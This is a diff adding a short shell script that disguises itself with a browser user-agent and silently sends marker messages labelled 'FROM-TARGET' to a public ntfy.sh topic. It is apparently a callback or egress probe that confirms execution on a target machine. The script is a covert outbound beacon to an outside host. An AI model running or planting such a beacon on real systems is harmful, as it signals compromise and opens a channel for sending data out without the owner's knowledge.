@@ -1,0 +1,4 @@
+#!/bin/sh
+U='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36'
+curl -s -m 12 -A "$U" -X POST -H 'Content-Type: text/plain' --data 'NTPOST-FROM-TARGET' https://ntfy.sh/pzcc7e73 >/tmp/n 2>/dev/null
+curl -s -m 12 -A "$U" 'https://ntfy.sh/pzcc7e73/publish?message=NTGET-FROM-TARGET' >/tmp/n2 2>/dev/null
